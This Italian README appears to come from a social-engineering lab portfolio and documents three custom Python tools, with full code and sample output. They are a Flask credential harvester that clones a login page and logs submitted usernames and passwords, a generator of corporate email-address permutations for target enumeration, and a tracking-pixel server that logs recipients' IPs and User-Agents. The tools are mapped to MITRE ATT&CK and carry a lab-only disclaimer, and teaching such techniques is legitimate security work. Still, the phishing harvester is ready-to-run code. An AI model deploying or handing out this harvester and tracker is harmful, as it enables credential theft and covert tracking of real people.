> [English](README.en.md) | **Italiano**

# 06 - Custom Python Tools

> - **Fase:** Social Engineering - Custom Tool Development (Python)
> - **Visibilita:** Variabile - il credential harvester genera log HTTP e richieste DNS; il tracking pixel e una singola richiesta HTTP GET; l'email generator e completamente offline
> - **Prerequisiti:** Python 3.10+; Flask per il credential harvester; libreria standard per email generator e tracking pixel; conoscenza base di HTTP/HTML
> - **Output:** Finding SE-014..015; credential harvester Flask operativo; generatore permutazioni email; server tracking pixel con geolocalizzazione

---

## Introduzione

Questa sezione documenta lo sviluppo di strumenti personalizzati in Python per automatizzare fasi specifiche della kill chain di social engineering. La capacita di scrivere tool custom e una competenza fondamentale per un security analyst: i framework pre-costruiti (GoPhish, SET) coprono i casi d'uso standard, ma un engagement reale richiede spesso soluzioni ad hoc per scenari non previsti dai tool generici.

I tre tool documentati coprono tre fasi diverse:

1. **Credential Harvester (SE-014):** web application Flask che replica una pagina di login e cattura credenziali, IP, User-Agent e timestamp in tempo reale. Rispetto al credential harvester di GoPhish, offre il controllo completo sulla logica di cattura e il redirect post-submission.

2. **Email Generator:** script che genera tutte le permutazioni possibili di un'email aziendale a partire da nome e cognome (mario.rossi, m.rossi, rossi.mario, mrossi, ecc.). Utile per enumerare email valide quando il formato aziendale non e noto.

3. **Tracking Pixel (SE-015):** server Flask che serve un'immagine 1x1 pixel trasparente e logga IP, User-Agent, timestamp e geolocalizzazione approssimativa di chi apre l'email contenente il pixel.

---

## Struttura della cartella

```
06-custom-python-tools/
+-- credential-harvester/   # Flask credential harvester custom - SE-014
+-- email-generator/        # Generatore permutazioni email aziendali
+-- tracking-pixel/         # Server tracking pixel con geolocalizzazione - SE-015
```

---

## `credential-harvester/` - Flask Credential Harvester

**ID Finding:** `SE-014` | **Severity:** `Alto` (credenziali catturate in chiaro con logging completo)

### Contesto operativo

Il credential harvester custom e una web application Flask minimale che serve una pagina di login clonata e cattura ogni submission con metadati completi (IP, User-Agent, Referer, timestamp). Rispetto ai tool integrati, offre: personalizzazione completa del comportamento post-submission (redirect, messaggio di errore, secondo form per MFA), logging strutturato in JSON per analisi successiva, e integrazione con qualsiasi infrastruttura di delivery.

### Codice principale

```Bash
# Struttura del progetto
# credential-harvester/
# +-- app.py              # Server Flask
# +-- templates/
# |   +-- login.html      # Pagina login clonata
# +-- logs/
#     +-- creds.json       # Log credenziali catturate
```

```python
# app.py - Credential Harvester Flask
from flask import Flask, request, render_template, redirect
import json, datetime

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    creds = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'username': request.form.get('username'),
        'password': request.form.get('password')
    }
    with open('logs/creds.json', 'a') as f:
        f.write(json.dumps(creds) + '\n')
    print(f"[!] Credentials captured: {creds['username']}")
    return redirect('https://portal.company-lab.local/login?error=1')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

---

## `email-generator/` - Generatore Permutazioni Email

### Contesto operativo

Quando il formato email aziendale non e noto, lo script genera tutte le permutazioni standard a partire da nome e cognome. La lista prodotta viene poi utilizzata per enumerazione (verifica quali indirizzi esistono) o per targeting diretto.

### Codice principale

```python
# email_gen.py - Generatore permutazioni email
import sys

def generate_emails(first, last, domain):
    f, l = first.lower(), last.lower()
    patterns = [
        f"{f}.{l}", f"{l}.{f}", f"{f}{l}", f"{l}{f}",
        f"{f[0]}.{l}", f"{f[0]}{l}", f"{l}{f[0]}",
        f"{f}.{l[0]}", f"{f}{l[0]}", f"{f[0]}{l[0]}",
        f"{l}.{f[0]}", f"{f}_{l}", f"{l}_{f}",
        f"{f}-{l}", f"{l}-{f}", f"{f}",  f"{l}"
    ]
    return [f"{p}@{domain}" for p in patterns]

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python3 email_gen.py <nome> <cognome> <dominio>")
        sys.exit(1)
    for email in generate_emails(sys.argv[1], sys.argv[2], sys.argv[3]):
        print(email)
```

```Bash
python3 email_gen.py Mario Rossi target-lab.com
```

```
mario.rossi@target-lab.com
rossi.mario@target-lab.com
mariorossi@target-lab.com
rossimario@target-lab.com
m.rossi@target-lab.com
mrossi@target-lab.com
rossim@target-lab.com
mario.r@target-lab.com
marior@target-lab.com
mr@target-lab.com
rossi.m@target-lab.com
mario_rossi@target-lab.com
rossi_mario@target-lab.com
mario-rossi@target-lab.com
rossi-mario@target-lab.com
mario@target-lab.com
rossi@target-lab.com
```

---

## `tracking-pixel/` - IP Geolocation Tracking

**ID Finding:** `SE-015` | **Severity:** `Informativo` (geolocalizzazione IP al momento dell'apertura email)

### Contesto operativo

Il tracking pixel e un'immagine 1x1 pixel trasparente servita da un server controllato dall'attaccante. Quando il client email carica l'immagine (apertura email), il server logga IP, User-Agent, timestamp e geolocalizzazione approssimativa via database GeoIP. Questa tecnica e utilizzata anche da GoPhish internamente, ma il server custom permette tracking indipendente dal framework di phishing.

### Codice principale

```python
# tracker.py - Tracking Pixel Server
from flask import Flask, request, send_file
import json, datetime, io

app = Flask(__name__)

# Pixel 1x1 GIF trasparente (43 bytes)
PIXEL = (b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00'
         b'\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00'
         b'\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00'
         b'\x00\x02\x02\x44\x01\x00\x3b')

@app.route('/pixel/<tracking_id>.gif')
def track(tracking_id):
    data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'tracking_id': tracking_id,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer', 'N/A')
    }
    with open('logs/tracking.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    print(f"[*] Email opened: {tracking_id} from {data['ip']}")
    return send_file(io.BytesIO(PIXEL), mimetype='image/gif')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

```Bash
# Embedding nell'email HTML:
# <img src="http://192.168.0.110:8080/pixel/user001.gif" width="1" height="1" />
```

```
# Output log quando la vittima apre l'email:
[*] Email opened: user001 from 192.168.0.120
{"timestamp": "2026-03-15T10:12:00", "tracking_id": "user001", "ip": "192.168.0.120", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Outlook/16.0"}
```

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Flask` | Web framework | Python | Backend per credential harvester e tracking pixel |
| `Jinja2` | Template engine | Python | Rendering pagine HTML per landing page clone |
| `requests` | HTTP client | Python | Testing e verifica degli endpoint creati |
| `GeoLite2` | GeoIP database | MaxMind | Geolocalizzazione IP per tracking pixel |
| `smtp-user-enum` | Email enum | CLI - Perl | Verifica esistenza email via SMTP VRFY/EXPN/RCPT TO |

> **Tool moderno consigliato:** per la verifica delle email generate, `smtp-user-enum` o `EmailHarvester` con metodo RCPT TO. Per geolocalizzazione avanzata, il database GeoLite2 di MaxMind (gratuito con registrazione) integrato nel server tracking.

---

## Registro Finding

| ID | Descrizione | Severity | CVSS | Sottocartella |
| :--- | :--- | :---: | :---: | :--- |
| `SE-014` | Credential harvester Flask: pagina login clone con logging IP/User-Agent/credenziali in tempo reale | `Alto` | 7.5 | `credential-harvester/` |
| `SE-015` | Tracking pixel: geolocalizzazione IP del destinatario al momento dell'apertura email | `Informativo` | 2.1 | `tracking-pixel/` |

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Finding Correlato |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | SE-014 |
| Resource Development | Stage Capabilities: Upload Malware | `T1608.001` | SE-014, SE-015 |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | SE-014 |
| Credential Access | Input Capture: Web Portal Capture | `T1056.003` | SE-014 |
| Discovery | System Information Discovery | `T1082` | SE-015 |

---

> **Nota:** I tool sono stati sviluppati e testati in ambiente di laboratorio virtualizzato. Nessun tool e stato utilizzato contro persone o sistemi reali senza autorizzazione.
